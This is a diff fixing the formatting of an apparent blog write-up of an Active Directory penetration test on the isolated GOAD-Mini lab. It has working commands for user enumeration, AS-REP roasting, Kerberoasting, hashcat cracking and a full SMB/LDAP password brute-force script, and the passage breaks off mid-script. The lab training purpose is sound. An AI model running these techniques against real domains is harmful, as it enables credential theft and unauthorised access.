@@ -91,17 +91,17 @@ The primary objectives of this penetration test were:
 
 **Domain Controller:**
 
-- **Hostname:**KINGSLANDING
+- **Hostname:** KINGSLANDING
 
-- **Domain:**SEVENKINGDOMS / sevenkingdoms.local
+- **Domain:** SEVENKINGDOMS / sevenkingdoms.local
 
-- **Domain SID:**S-1–5–21–3262952663–1425775882–330886615
+- **Domain SID:** S-1–5–21–3262952663–1425775882–330886615
 
-- **IP Address:**192.168.56.10
+- **IP Address:** 192.168.56.10
 
-- **Operating System:**Microsoft Windows Server 2019
+- **Operating System:** Microsoft Windows Server 2019
 
-- **Role:**Domain Controller with Active Directory Domain Services (AD DS)
+- **Role:** Domain Controller with Active Directory Domain Services (AD DS)
 
 ### Lab Configuration
 
@@ -123,19 +123,18 @@ The GOAD-Mini lab was deployed using VirtualBox and Vagrant, providing an isolat
 
 **Attacker Machine:**
 
-- **OS:**Linux (Kali/Debian-based)
+- **OS:** Linux (Kali/Debian-based)
 
-- **Tools:**Nmap, Impacket, Enum4linux, HexStrike MCP tools, custom scripts
+- **Tools:** Nmap, Impacket, Enum4linux, HexStrike MCP tools, custom scripts
 
-- **Network:**Host-only network (192.168.56.0/24)
+- **Network:** Host-only network (192.168.56.0/24)
 
 ## Penetration Test Methodology
 
 This penetration test followed a structured methodology based on industry-standard frameworks, adapted for AD environments:
 
 ```text
-1.
- Reconnaissance
+1. Reconnaissance
    └─ Network discovery and service enumeration
 ```
 
@@ -211,7 +210,7 @@ The penetration test began with network discovery to identify the target and enu
 
 **Comprehensive Port Scan:**
 
-Using**Nmap:**
+Using **Nmap:**
 
 [**Mastering Nmap: A Comprehensive Guide to Network Exploration and Security Auditing. Part 1**
 [This comprehensive post will delve into the powerful network scanning tool, Nmap, exploring its capabilities from basic…](../2024/2024-10-26-mastering-nmap-a-comprehensive-guide-to-network-exploration-and-security-auditing-part-1-f36d74d1b2c0.md)
@@ -219,16 +218,7 @@ Using**Nmap:**
 A full TCP port scan was performed to identify all open ports and services:
 
 ```text
-nmap -sV -sC -
-p
-- 
---min-rate
- 
-1000
- 
-192.168
-.
-56.10
+nmap -sV -sC -p- --min-rate 1000 192.168.56.10
 ```
 
 **Results:**
@@ -239,30 +229,25 @@ The scan revealed 14 open ports, indicating a fully configured domain controller
 
 **Key Findings:**
 
-- **Standard AD Ports:**All expected AD services were running, confirming this was a domain controller
+- **Standard AD Ports:** All expected AD services were running, confirming this was a domain controller
 
-- **Web Services:**Port 80 (HTTP) was open, potentially exposing web-based management interfaces
+- **Web Services:** Port 80 (HTTP) was open, potentially exposing web-based management interfaces
 
-- **Remote Management:**WinRM ports (5985/5986) were accessible, enabling remote administration
+- **Remote Management:** WinRM ports (5985/5986) were accessible, enabling remote administration
 
-- **LDAP Services:**Both standard and secure LDAP were available, along with global catalog services
+- **LDAP Services:** Both standard and secure LDAP were available, along with global catalog services
 
 ### Service Version Detection
 
 Nmap’s service detection identified the domain name and site information:
 
 ```text
-Domain:
- sevenkingdoms.local
-Site:
- 
-Default
--First-Site-Name
-Hostname:
- kingslanding.sevenkingdoms.local
+Domain: sevenkingdoms.local
+Site: Default-First-Site-Name
+Hostname: kingslanding.sevenkingdoms.local
 ```
 
-This information confirmed the target was indeed a domain controller for the`sevenkingdoms.local`domain.
+This information confirmed the target was indeed a domain controller for the `sevenkingdoms.local` domain.
 
 <img src="https://cdn-images-1.medium.com/max/800/1*TmylXLirh-TJ1qAgbE8Arw.png" alt="Article image" width="693" height="315" loading="lazy" decoding="async" />
 
@@ -270,17 +255,17 @@ This information confirmed the target was indeed a domain controller for the`sev
 
 The scan also revealed SSL certificates for LDAP services:
 
-- **Subject:**commonName=kingslanding.sevenkingdoms.local
+- **Subject:** commonName=kingslanding.sevenkingdoms.local
 
-- **Valid From:**2026–01–24
+- **Valid From:** 2026–01–24
 
-- **Valid To:**2027–01–24
+- **Valid To:** 2027–01–24
 
-- **SAN:**DNS:kingslanding.sevenkingdoms.local
+- **SAN:** DNS:kingslanding.sevenkingdoms.local
 
 <img src="https://cdn-images-1.medium.com/max/800/1*eYpS5qBQSoomIHKLUoDEzQ.png" alt="Article image" width="1344" height="139" loading="lazy" decoding="async" />
 
-**Proof:**Network scan results documented in`nmap/full_scan.txt`
+**Proof:** Network scan results documented in `nmap/full_scan.txt`
 
 ## Phase 2: Service Enumeration
 
@@ -290,34 +275,29 @@ SMB (Server Message Block) is a critical protocol in Windows environments, often
 
 ### Enum4linux Enumeration
 
-**Tool:**Enum4linux v0.9.1
+**Tool:** Enum4linux v0.9.1
 
 **Command:**
 
 ```text
-enum4linux -
-a
- 
-192.168
-.
-56.10
+enum4linux -a 192.168.56.10
 ```
 
 **Key Findings:**
 
 - **Domain Information:**
 
-- **Domain/Workgroup:**SEVENKINGDOMS
+- **Domain/Workgroup:** SEVENKINGDOMS
 
-- **Domain SID:**S-1–5–21–3262952663–1425775882–330886615
+- **Domain SID:** S-1–5–21–3262952663–1425775882–330886615
 
-- **NetBIOS Name:**KINGSLANDING
+- **NetBIOS Name:** KINGSLANDING
 
 **2. Network Information:**
 
-- **MAC Address:**08:00:27:cd:d4:fb (Oracle VirtualBox virtual NIC)
+- **MAC Address:** 08:00:27:cd:d4:fb (Oracle VirtualBox virtual NIC)
 
-- **Anonymous Sessions:**Allowed (username ‘’, password ‘’)
+- **Anonymous Sessions:** Allowed (username ‘’, password ‘’)
 
 **3. Security Configuration:**
 
@@ -333,19 +313,12 @@ The discovery that anonymous sessions were allowed is significant. While this do
 
 ### Enum4linux-ng Advanced Enumeration
 
-**Tool:**Enum4linux-ng
+**Tool:** Enum4linux-ng
 
 **Command:**
 
 ```text
-enum4linux-ng -
-A
- -oJ enum4linux-ng
-.json
- 
-192.168
-.
-56.10
+enum4linux-ng -A -oJ enum4linux-ng.json 192.168.56.10
 ```
 
 This tool provided additional enumeration capabilities, including:
@@ -360,36 +333,17 @@ This tool provided additional enumeration capabilities, including:
 
 ### NetBIOS Name Resolution
 
-**Tool:**HexStrike MCP nbtscan
+**Tool:** HexStrike MCP nbtscan
 
 **Results:**
 
 ```text
-IP
- address       
-Net
-BIOS 
-Name
-     
-Server
-    
-User
-             
-MAC
- address
+IP address       NetBIOS Name     Server    User             MAC address
 ------------------------------------------------------------------------------
-192.168.56.10    KINGSLANDING     <server>
-  <unknown>        08
-:
-00
-:
-27
-:cd
-:d4
-:fb
+192.168.56.10    KINGSLANDING     <server>  <unknown>        08:00:27:cd:d4:fb
 ```
 
-**Proof:**SMB enumeration results documented in`smb/enum4linux.txt`and`smb/enum4linux-ng.txt`
+**Proof:** SMB enumeration results documented in `smb/enum4linux.txt` and `smb/enum4linux-ng.txt`
 
 ### Nmap SMB Scripts
 
@@ -397,24 +351,23 @@ Nmap’s SMB-specific NSE scripts were executed to gather additional information
 
 **Scripts Used:**
 
-- `smb-enum-shares`- Enumerate SMB shares
+- `smb-enum-shares` - Enumerate SMB shares
 
-- `smb-enum-users`- Enumerate users
+- `smb-enum-users` - Enumerate users
 
-- `smb-enum-domains`- Enumerate domain information
+- `smb-enum-domains` - Enumerate domain information
 
-- `smb-os-discovery`- OS detection
+- `smb-os-discovery` - OS detection
 
-- `smb-security-mode`- Security mode detection
+- `smb-security-mode` - Security mode detection
 
-- `smb-vuln-*`- Vulnerability detection
+- `smb-vuln-*` - Vulnerability detection
 
 ```text
-nmap 
---script=smb* 192.168.56.10
+nmap --script=smb* 192.168.56.10
 ```
 
-**Key Finding:**SMB signing was confirmed as enabled and required, which is a security best practice.
+**Key Finding:** SMB signing was confirmed as enabled and required, which is a security best practice.
 
 ## Phase 3: User Enumeration and Discovery
 
@@ -426,30 +379,21 @@ Before attempting password attacks, we need to identify legitimate user accounts
 
 ### Technique 1: Kerberos User Enumeration (Kerbrute)
 
-**Tool:**Kerbrute
+**Tool:** Kerbrute
 
-**Method:**Kerberos pre-authentication can reveal whether a username exists without requiring a password. When a valid username is provided, the response differs from an invalid username.
+**Method:** Kerberos pre-authentication can reveal whether a username exists without requiring a password. When a valid username is provided, the response differs from an invalid username.
 
 **Command:**
 
 ```text
-kerbrute userenum 
---dc
- 
-192.168
-.
-56.10
- -d sevenkingdoms
-.local
- userlist
-.txt
+kerbrute userenum --dc 192.168.56.10 -d sevenkingdoms.local userlist.txt
 ```
 
 **How It Works:**
 
-- Valid usernames return`KDC_ERR_PREAUTH_REQUIRED`(username exists, password required)
+- Valid usernames return `KDC_ERR_PREAUTH_REQUIRED` (username exists, password required)
 
-- Invalid usernames return`KDC_ERR_C_PRINCIPAL_UNKNOWN`(username doesn't exist)
+- Invalid usernames return `KDC_ERR_C_PRINCIPAL_UNKNOWN` (username doesn't exist)
 
 - This allows enumeration without triggering account lockouts
 
@@ -467,25 +411,20 @@ kerbrute userenum
 
 ### Technique 2: SMB User Enumeration
 
-**Tool:**Enum4linux, RPCClient
+**Tool:** Enum4linux, RPCClient
 
-**Method:**Attempting to enumerate users via SMB/RPC protocols.
+**Method:** Attempting to enumerate users via SMB/RPC protocols.
 
 **Command:**
 
 ```text
-enum4linux -U 
-192.168
-.56
-.10
+enum4linux -U 192.168.56.10
 ```
 
 **Alternative with RPCClient:**
 
 ```text
-rpcclient -U 
-""
- -N 192.168.56.10
+rpcclient -U "" -N 192.168.56.10
 > enumdomusers
 ```
 
@@ -499,52 +438,38 @@ rpcclient -U
 
 ### Technique 3: LDAP User Enumeration (Anonymous)
 
-**Tool:**ldapsearch
+**Tool:** ldapsearch
 
-**Method:**Attempting anonymous LDAP queries to enumerate users.
+**Method:** Attempting anonymous LDAP queries to enumerate users.
 
 **Command:**
 
 ```text
-ldapsearch -x -H 
-"ldap://192.168.56.10"
- \
-  -b 
-"DC=sevenkingdoms,DC=local"
- \
-  
-"(objectClass=user)"
- sAMAccountName
+ldapsearch -x -H "ldap://192.168.56.10" \
+  -b "DC=sevenkingdoms,DC=local" \
+  "(objectClass=user)" sAMAccountName
 ```
 
-**Result:**Typically fails in properly configured AD environments (authentication required)
+**Result:** Typically fails in properly configured AD environments (authentication required)
 
 <img src="https://cdn-images-1.medium.com/max/800/1*77EydMhfxGFZV6jYOVr98Q.png" alt="Article image" width="1307" height="407" loading="lazy" decoding="async" />
 
 ### Technique 4: AS-REP Roasting for User Discovery
 
-**Tool:**Impacket GetNPUsers
+**Tool:** Impacket GetNPUsers
 
-**Method:**AS-REP Roasting can reveal usernames of accounts with pre-authentication disabled.
+**Method:** AS-REP Roasting can reveal usernames of accounts with pre-authentication disabled.
 
 **Command:**
 
 ```text
-GetNPUsers.py sevenkingdoms.
-local
-/ \
-  -dc-ip 
-192.168
-.56
-.10
- \
+GetNPUsers.py sevenkingdoms.local/ \
+  -dc-ip 192.168.56.10 \
   -usersfile userlist.txt \
-  -
-format
- hashcat
+  -format hashcat
 ```
 
-**Benefit:**Discovers both valid usernames AND vulnerable accounts simultaneously.
+**Benefit:** Discovers both valid usernames AND vulnerable accounts simultaneously.
 
 <img src="https://cdn-images-1.medium.com/max/800/1*w6yYXJQIoMjamOrSFK8MCg.png" alt="Article image" width="1921" height="663" loading="lazy" decoding="async" />
 
@@ -552,20 +477,20 @@ Your run is successful. The important line is this one:
 
 `$krb5asrep$23$TestUser@SEVENKINGDOMS.LOCAL:...`
 
-That means**AS-REP Roasting worked for**`**TestUser**`(the account is configured with**“Do not require Kerberos pre-authentication”**), and Impacket returned an AS-REP hash in**hashcat format**.
+That means **AS-REP Roasting worked for** `**TestUser**` (the account is configured with **“Do not require Kerberos pre-authentication”**), and Impacket returned an AS-REP hash in **hashcat format**.
 
-Everything else in the output is just per-user status from your`userlist.txt`:
+Everything else in the output is just per-user status from your `userlist.txt`:
 
 ### What the messages mean
 
 - `User &lt;X&gt; doesn't have UF_DONT_REQUIRE_PREAUTH set`
-The user**requires pre-auth**, so**not AS-REP roastable**(nothing to extract).
+ The user **requires pre-auth**, so **not AS-REP roastable** (nothing to extract).
 
 - `KDC_ERR_C_PRINCIPAL_UNKNOWN (Client not found in Kerberos database)`
-That username**does not exist**in the domain (typo / wrong list / wrong realm).
+ That username **does not exist** in the domain (typo / wrong list / wrong realm).
 
 - `KDC_ERR_CLIENT_REVOKED (Clients credentials have been revoked)`
-The account is**disabled / locked / revoked**, so KDC refuses it.
+ The account is **disabled / locked / revoked**, so KDC refuses it.
 
 ### Next practical steps
 
@@ -574,28 +499,18 @@ The account is**disabled / locked / revoked**, so KDC refuses it.
 Run again and write results to a file:
 
 ```text
-GetNPUsers.py sevenkingdoms.
-local
-/ \
-  -dc-ip 
-192.168
-.56
-.10
- \
+GetNPUsers.py sevenkingdoms.local/ \
+  -dc-ip 192.168.56.10 \
   -usersfile userlist.txt \
-  -
-format
- hashcat \
+  -format hashcat \
   -outputfile asrep_hashes.txt
 ```
 
 Then check what you got:
 
 ```text
-wc
- -l asrep_hashes.txt
-head
- -n 5 asrep_hashes.txt
+wc -l asrep_hashes.txt
+head -n 5 asrep_hashes.txt
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*m2aZKSmpZBd4Nu_Xyfz1uQ.png" alt="Article image" width="1913" height="143" loading="lazy" decoding="async" />
@@ -605,21 +520,10 @@ head
 [**Breaking the Code: How to Use Hashcat for Effective Password Cracking**
 [Your step-by-step guide to mastering Hashcat, from setting it up on your system to deploying it against complex…](../2024/2024-11-03-breaking-the-code-how-to-use-hashcat-for-effective-password-cracking-15f8da8facb8.md)
 
-Hashcat mode for`$krb5asrep$23$...`is typically**18200**:
+Hashcat mode for `$krb5asrep$23$...` is typically **18200**:
 
 ```text
-hashcat -m 
-18200
- -
-a
- 
-0
- asrep_hashes
-.txt
- /path/
-to
-/wordlist
-.txt
+hashcat -m 18200 -a 0 asrep_hashes.txt /path/to/wordlist.txt
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*swNSuvNyqID-ENH86JCm5A.png" alt="Article image" width="1914" height="609" loading="lazy" decoding="async" />
@@ -628,7 +532,7 @@ Cracked: TestUser@Password123!
 
 ### User Enumeration Results
 
-Through Kerbrute and other enumeration techniques, we discovered**27 legitimate user accounts**in the domain and one password.
+Through Kerbrute and other enumeration techniques, we discovered **27 legitimate user accounts** in the domain and one password.
 
 - Administrator
 
@@ -688,15 +592,15 @@ Through Kerbrute and other enumeration techniques, we discovered**27 legitimate 
 
 The user list reveals several interesting accounts:
 
-- **Service Accounts:**ExchangeService, FileService, SQLService, WebService — These are prime targets for Kerberoasting attacks
+- **Service Accounts:** ExchangeService, FileService, SQLService, WebService — These are prime targets for Kerberoasting attacks
 
-- **Test Accounts:**ASREPUser1, ASREPUser2, SprayUser1, SprayUser2, TestAdmin, TestUser — These appear to be intentionally vulnerable accounts for testing
+- **Test Accounts:** ASREPUser1, ASREPUser2, SprayUser1, SprayUser2, TestAdmin, TestUser — These appear to be intentionally vulnerable accounts for testing
 
-- **Character Accounts:**Multiple accounts named after Game of Thrones characters (cersei.lannister, jaime.lannister, etc.) — These are part of GOAD’s themed naming convention
+- **Character Accounts:** Multiple accounts named after Game of Thrones characters (cersei.lannister, jaime.lannister, etc.) — These are part of GOAD’s themed naming convention
 
-- **Privileged Accounts:**Administrator, DCSyncUser — High-value targets
+- **Privileged Accounts:** Administrator, DCSyncUser — High-value targets
 
-- **System Accounts:**krbtgt, KINGSLANDING$ — Critical system accounts
+- **System Accounts:** krbtgt, KINGSLANDING$ — Critical system accounts
 
 ## Discovered Groups
 
@@ -712,7 +616,7 @@ Group enumeration revealed the standard AD group structure, including:
 
 - Custom groups
 
-**Proof:**LDAP enumeration results documented in`ldap/users_authenticated.txt`and`ldap/groups_authenticated.txt`
+**Proof:** LDAP enumeration results documented in `ldap/users_authenticated.txt` and `ldap/groups_authenticated.txt`
 
 ## Phase 4: Password Discovery and Credential
 
@@ -730,18 +634,10 @@ With a list of legitimate users identified in Phase 3, this phase focuses on dis
 **First run again GetNPUsers.py on list with enumerated users:**
 
 ```text
-GetNPUsers.py sevenkingdoms.
-local
-/ \
-  -dc-ip 
-192.168
-.56
-.10
- \
+GetNPUsers.py sevenkingdoms.local/ \
+  -dc-ip 192.168.56.10 \
   -usersfile userlist.txt \
-  -
-format
- hashcat \
+  -format hashcat \
   -outputfile asrep_hashes.txt
 ```
 
@@ -755,16 +651,16 @@ hashcat -m 18200 -a 0 asrep_hashes.txt ./passlist.txt
 
 <img src="https://cdn-images-1.medium.com/max/800/1*cyQFtSRGjjO5PxgCt-hNeg.png" alt="Article image" width="1922" height="790" loading="lazy" decoding="async" />
 
-**Cracker 2 additional users:
-**ASREPUser1:Password123!
+**Cracker 2 additional users:** 
+ASREPUser1:Password123!
 
 ASREPUser2:Password123!
 
 ### Technique 1: Dictionary-Based Password Brute Force
 
-**Tool:**Hydra, smbclient, custom scripts
+**Tool:** Hydra, smbclient, custom scripts
 
-**Method:**Testing discovered usernames against password wordlists.
+**Method:** Testing discovered usernames against password wordlists.
 
 **Password Wordlist:**
 
@@ -776,14 +672,13 @@ ASREPUser2:Password123!
 
 - Password patterns from GOAD documentation
 
-**Wordlist Location:**`AD_PenTest/wordlists/passwords.txt`
+**Wordlist Location:** `AD_PenTest/wordlists/passwords.txt`
 
 **SMB Brute Force:**
 
 ```text
 hydra -L users.txt -P goad-passwords.txt \
-  smb:
-//192.168.56.10 \
+  smb://192.168.56.10 \
   -t 4 -V
 ```
 
@@ -806,62 +701,22 @@ Hydra’s SMB module fails with modern Windows Server 2019 because:
 **Custom Script Approach:**
 
 ```text
-09:19:28 andrey@andrey-lab ~ → 
-for
- user 
-in
- $(
-cat
- users.txt); 
-do
-  
-for
- password 
-in
- $(
-cat
- passlist.txt); 
-do
-    smbclient -L 192.168.56.10 -U 
-"
-$user
-%
-$password
-"
- -N >/dev/null 2>&1
-    
-if
- [ $? -eq 0 ]; 
-then
-      
-echo
- 
-"VALID: 
-$user
-:
-$password
-"
- >> valid_credentials.txt
-      
-echo
- 
-"✓ Found: 
-$user
-:
-$password
-"
-    
-fi
-  
-done
+09:19:28 andrey@andrey-lab ~ → for user in $(cat users.txt); do
+  for password in $(cat passlist.txt); do
+    smbclient -L 192.168.56.10 -U "$user%$password" -N >/dev/null 2>&1
+    if [ $? -eq 0 ]; then
+      echo "VALID: $user:$password" >> valid_credentials.txt
+      echo "✓ Found: $user:$password"
+    fi
+  done
 done
 ```
 
 ### Technique 2: Kerberoasting
 
-**Tool:**Impacket GetUserSPNs
+**Tool:** Impacket GetUserSPNs
 
-**Method:**Requesting Service Principal Names (SPNs) and extracting encrypted service tickets for offline cracking.
+**Method:** Requesting Service Principal Names (SPNs) and extracting encrypted service tickets for offline cracking.
 
 **Why Kerberoasting:**
 
@@ -878,14 +733,8 @@ done
 First, need at least one valid credential (or anonymous if allowed). Was found in previous step:
 
 ```text
-GetUserSPNs.py -dc-ip 
-192.168
-.56
-.10
- \
-  sevenkingdoms.
-local
-/TestUser:Password123! \
+GetUserSPNs.py -dc-ip 192.168.56.10 \
+  sevenkingdoms.local/TestUser:Password123! \
   -request \
   -outputfile kerberoast_hashes.txt
 ```
@@ -916,26 +765,18 @@ hashcat -m 13100 kerberoast_hashes.txt \
 
 ### Technique 3: AS-REP Roasting
 
-**Tool:**Impacket GetNPUsers
+**Tool:** Impacket GetNPUsers
 
-**Method:**Extracting encrypted TGTs from accounts with pre-authentication disabled.
+**Method:** Extracting encrypted TGTs from accounts with pre-authentication disabled.
 
 **Command:**
 
 ```text
-impacket-GetNPUsers -dc-ip 
-192.168
-.56
-.10
- \
+impacket-GetNPUsers -dc-ip 192.168.56.10 \
   -usersfile discovered_users.txt \
-  -
-format
- hashcat \
+  -format hashcat \
   -outputfile asrep_hashes.txt \
-  sevenkingdoms.
-local
-/
+  sevenkingdoms.local/
 ```
 
 **Target Accounts:**
@@ -946,7 +787,7 @@ local
 
 - Any account with pre-authentication disabled
 
-**Advantage:**No credentials required — can be performed anonymously if accounts are vulnerable.
+**Advantage:** No credentials required — can be performed anonymously if accounts are vulnerable.
 
 ## AD Password Brute Force
 
@@ -958,52 +799,41 @@ After enumerating all AD users using valid LDAP credentials, you can now perform
 
 **Completed:**
 
-- Valid LDAP credentials:`TestUser:Password123!`
+- Valid LDAP credentials: `TestUser:Password123!`
 
-- Enumerated 26 AD users saved to:`AD_PenTest/results/users.txt`
+- Enumerated 26 AD users saved to: `AD_PenTest/results/users.txt`
 
-- Password wordlist:`AD_PenTest/wordlists/passlist.txt`
+- Password wordlist: `AD_PenTest/wordlists/passlist.txt`
 
 ### Enumerated Users
 
-From your GOAD-Mini lab, we found**26 users**:
+From your GOAD-Mini lab, we found **26 users**:
 
 ```text
 Administrator
 ASREPUser1
 ASREPUser2
-cersei.
-lannister
+cersei.lannister
 DCSyncUser
 ExchangeService
 FileService
 Guest
-jaime.
-lannister
-joffrey.
-baratheon
+jaime.lannister
+joffrey.baratheon
 krbtgt
-lord.
-varys
-maester.
-pycelle
-petyer.
-baelish
-renly.
-baratheon
-robert.
-baratheon
+lord.varys
+maester.pycelle
+petyer.baelish
+renly.baratheon
+robert.baratheon
 SprayUser1
 SprayUser2
 SQLService
-stannis.
-baratheon
+stannis.baratheon
 TestAdmin
 TestUser
-tyron.
-lannister
-tywin.
-lannister
+tyron.lannister
+tywin.lannister
 vagrant
 WebService
 ```
@@ -1012,539 +842,166 @@ WebService
 
 ### Method 1: Using smbclient (Recommended)
 
-**Why:**Works reliably with modern Windows SMB, handles SMB signing correctly.
+**Why:** Works reliably with modern Windows SMB, handles SMB signing correctly.
 
-**Script:**`AD_PenTest/scripts/bruteforce-ad-passwords.sh`
+**Script:** `AD_PenTest/scripts/bruteforce-ad-passwords.sh`
 
 ```text
 #!/bin/bash
+
 # Brute force passwords against enumerated AD users
 # Usage: ./bruteforce-ad-passwords.sh <dc_ip> <users_file> <passwords_file>
-set
- -e
-DC_IP=
-"
-${1:-192.168.56.10}
-"
-USERS_FILE=
-"
-${2:-AD_PenTest/results/ad_users_simple.txt}
-"
-PASSWORDS_FILE=
-"
-${3:-AD_PenTest/wordlists/comprehensive-passwords-clean.txt}
-"
-OUTPUT_DIR=
-"AD_PenTest/results"
-RESULTS_FILE=
-"
-${OUTPUT_DIR}
-/bruteforce_valid_credentials.txt"
-LOG_FILE=
-"
-${OUTPUT_DIR}
-/bruteforce.log"
-LOCKED_ACCOUNTS=
-"
-${OUTPUT_DIR}
-/locked_accounts.txt"
+
+set -e
+
+DC_IP="${1:-192.168.56.10}"
+USERS_FILE="${2:-AD_PenTest/results/ad_users_simple.txt}"
+PASSWORDS_FILE="${3:-AD_PenTest/wordlists/comprehensive-passwords-clean.txt}"
+
+OUTPUT_DIR="AD_PenTest/results"
+RESULTS_FILE="${OUTPUT_DIR}/bruteforce_valid_credentials.txt"
+LOG_FILE="${OUTPUT_DIR}/bruteforce.log"
+LOCKED_ACCOUNTS="${OUTPUT_DIR}/locked_accounts.txt"
+
 # Delay between attempts (seconds) to avoid lockouts
 DELAY=1
-mkdir
- -p 
-"
-$OUTPUT_DIR
-"
+
+mkdir -p "$OUTPUT_DIR"
+
 # Check if files exist
-if
- [ ! -f 
-"
-$USERS_FILE
-"
- ]; 
-then
-    
-echo
- 
-"Error: Users file not found: 
-$USERS_FILE
-"
-    
-echo
- 
-"Run enumerate-ad-users-ldap.sh first!"
-    
-exit
- 1
+if [ ! -f "$USERS_FILE" ]; then
+    echo "Error: Users file not found: $USERS_FILE"
+    echo "Run enumerate-ad-users-ldap.sh first!"
+    exit 1
 fi
-if
- [ ! -f 
-"
-$PASSWORDS_FILE
-"
- ]; 
-then
-    
-echo
- 
-"Error: Passwords file not found: 
-$PASSWORDS_FILE
-"
-    
-exit
- 1
+
+if [ ! -f "$PASSWORDS_FILE" ]; then
+    echo "Error: Passwords file not found: $PASSWORDS_FILE"
+    exit 1
 fi
-USER_COUNT=$(
-wc
- -l < 
-"
-$USERS_FILE
-"
-)
-PASS_COUNT=$(
-wc
- -l < 
-"
-$PASSWORDS_FILE
-"
-)
+
+USER_COUNT=$(wc -l < "$USERS_FILE")
+PASS_COUNT=$(wc -l < "$PASSWORDS_FILE")
 TOTAL_ATTEMPTS=$((USER_COUNT * PASS_COUNT))
-echo
- 
-"=========================================="
-echo
- 
-"AD Password Brute Force"
-echo
- 
-"=========================================="
-echo
- 
-"Target: 
-$DC_IP
-"
-echo
- 
-"Users: 
-$USER_COUNT
- (from 
-$USERS_FILE
-)"
-echo
- 
-"Passwords: 
-$PASS_COUNT
- (from 
-$PASSWORDS_FILE
-)"
-echo
- 
-"Total attempts: 
-$TOTAL_ATTEMPTS
-"
-echo
- 
-"Delay: 
-${DELAY}
-s between attempts"
-echo
- 
-"Results: 
-$RESULTS_FILE
-"
-echo
- 
-"Log: 
-$LOG_FILE
-"
-echo
- 
-""
+
+echo "=========================================="
+echo "AD Password Brute Force"
+echo "=========================================="
+echo "Target: $DC_IP"
+echo "Users: $USER_COUNT (from $USERS_FILE)"
+echo "Passwords: $PASS_COUNT (from $PASSWORDS_FILE)"
+echo "Total attempts: $TOTAL_ATTEMPTS"
+echo "Delay: ${DELAY}s between attempts"
+echo "Results: $RESULTS_FILE"
+echo "Log: $LOG_FILE"
+echo ""
+
 # Clear previous results
-> 
-"
-$RESULTS_FILE
-"
-> 
-"
-$LOCKED_ACCOUNTS
-"
-> 
-"
-$LOG_FILE
-"
-echo
- 
-"[*] Starting brute force attack..."
-echo
- 
-"    (This may take a while...)"
-echo
- 
-""
+> "$RESULTS_FILE"
+> "$LOCKED_ACCOUNTS"
+> "$LOG_FILE"
+
+echo "[*] Starting brute force attack..."
+echo "    (This may take a while...)"
+echo ""
+
 VALID_COUNT=0
 ATTEMPT_COUNT=0
 LOCKED_COUNT=0
+
 # Function to test credentials using smbclient
-test_credential
-() {
+test_credential() {
+    local user="$1"
+    local password="$2"
     
-local
- user=
-"
-$1
-"
+    # Try SMB authentication
+    smbclient -L "$DC_IP" -U "$user%$password" -N >/dev/null 2>&1
+    local smb_result=$?
     
-local
- password=
-"
-$2
-"
-    
-    
-# Try SMB authentication
-    smbclient -L 
-"
-$DC_IP
-"
- -U 
-"
-$user
-%
-$password
-"
- -N >/dev/null 2>&1
-    
-local
- smb_result=$?
-    
-    
-# Also try LDAP authentication
-    
-local
- domain=
-"sevenkingdoms.local"
-    ldapsearch -x -H 
-"ldap://
-$DC_IP
-:389"
- \
-        -D 
-"
-$user
-@
-$domain
-"
- \
-        -w 
-"
-$password
-"
- \
-        -b 
-"DC=sevenkingdoms,DC=local"
- \
-        
-"(sAMAccountName=
-$user
-)"
- \
+    # Also try LDAP authentication
+    local domain="sevenkingdoms.local"
+    ldapsearch -x -H "ldap://$DC_IP:389" \
+        -D "$user@$domain" \
+        -w "$password" \
+        -b "DC=sevenkingdoms,DC=local" \
+        "(sAMAccountName=$user)" \
         sAMAccountName >/dev/null 2>&1
+    local ldap_result=$?
     
-local
- ldap_result=$?
-    
-    
-# If either succeeds, credentials are valid
-    
-if
- [ 
-$smb_result
- -eq 0 ] || [ 
-$ldap_result
- -eq 0 ]; 
-then
-        
-return
- 0
-    
-else
-        
-return
- 1
-    
-fi
+    # If either succeeds, credentials are valid
+    if [ $smb_result -eq 0 ] || [ $ldap_result -eq 0 ]; then
+        return 0
+    else
+        return 1
+    fi
 }
+
 # Main brute force loop
-while
- IFS= 
-read
- -r user; 
-do
+while IFS= read -r user; do
+    if [ -z "$user" ]; then
+        continue
+    fi
     
-if
- [ -z 
-"
-$user
-"
- ]; 
-then
-        
-continue
+    # Skip comments
+    if [[ "$user" =~ ^# ]]; then
+        continue
+    fi
     
-fi
+    echo "[*] Testing user: $user" | tee -a "$LOG_FILE"
     
+    while IFS= read -r password; do
+        if [ -z "$password" ]; then
+            continue
+        fi
+        
+        # Skip comments
+        if [[ "$password" =~ ^# ]]; then
+            continue
+        fi
+        
+        ATTEMPT_COUNT=$((ATTEMPT_COUNT + 1))
+        
+        # Progress indicator every 50 attempts
+        if [ $((ATTEMPT_COUNT % 50)) -eq 0 ]; then
+            echo "    Progress: $ATTEMPT_COUNT/$TOTAL_ATTEMPTS attempts" | tee -a "$LOG_FILE"
+        fi
+        
+        # Test credential
+        if test_credential "$user" "$password"; then
+            VALID_COUNT=$((VALID_COUNT + 1))
+            echo "  [+] VALID CREDENTIALS: $user:$password" | tee -a "$RESULTS_FILE" | tee -a "$LOG_FILE"
+            echo "      Found at attempt $ATTEMPT_COUNT" | tee -a "$LOG_FILE"
+        else
+            # Check for account lockout indicators (optional - may need adjustment)
+            # This is a simplified check; real lockout detection is more complex
+            echo "  [-] Failed: $user:$password" >> "$LOG_FILE"
+        fi
+        
+        # Delay to avoid lockouts
+        sleep "$DELAY"
+        
+    done < "$PASSWORDS_FILE"
     
-# Skip comments
+    echo "" | tee -a "$LOG_FILE"
     
-if
- [[ 
-"
-$user
-"
- =~ ^
-# ]]; then
-        
-continue
-    
-fi
-    
-    
-echo
- 
-"[*] Testing user: 
-$user
-"
- | 
-tee
- -a 
-"
-$LOG_FILE
-"
-    
-    
-while
- IFS= 
-read
- -r password; 
-do
-        
-if
- [ -z 
-"
-$password
-"
- ]; 
-then
-            
-continue
-        
-fi
-        
-        
-# Skip comments
-        
-if
- [[ 
-"
-$password
-"
- =~ ^
-# ]]; then
-            
-continue
-        
-fi
-        
-        ATTEMPT_COUNT=$((ATTEMPT_COUNT + 
-1
-))
-        
-        
-# Progress indicator every 50 attempts
-        
-if
- [ $((ATTEMPT_COUNT % 
-50
-)) -eq 0 ]; 
-then
-            
-echo
- 
-"    Progress: 
-$ATTEMPT_COUNT
-/
-$TOTAL_ATTEMPTS
- attempts"
- | 
-tee
- -a 
-"
-$LOG_FILE
-"
-        
-fi
-        
-        
-# Test credential
-        
-if
- test_credential 
-"
-$user
-"
- 
-"
-$password
-"
-; 
-then
